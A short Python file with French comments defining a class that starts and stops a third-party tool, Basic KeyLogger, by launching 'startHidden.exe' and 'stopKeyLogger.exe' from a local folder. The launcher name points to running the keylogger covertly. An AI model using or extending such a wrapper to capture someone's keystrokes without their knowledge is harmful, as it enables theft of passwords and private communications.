# -*- coding: utf-8 -*-
"""
Created on Thu Feb  6 19:08:37 2020
@author: Louison VINCENT
"""

import subprocess
import os
#Location de BKL

class GestionBKL:
    def __init__(self):
        os.chdir(r".\basicKeyLogger") #Positionner le répertoire de travaille sur celui de Basic KeyLogger

    def lancer(self):
        """
        Lance le logiciel BKL
        """
        subprocess.Popen(["startHidden.exe"], shell=True)




    def arreter(self):
        """
        Arrête BKL
        """
        subprocess.Popen(["stopKeyLogger.exe"], shell=True)
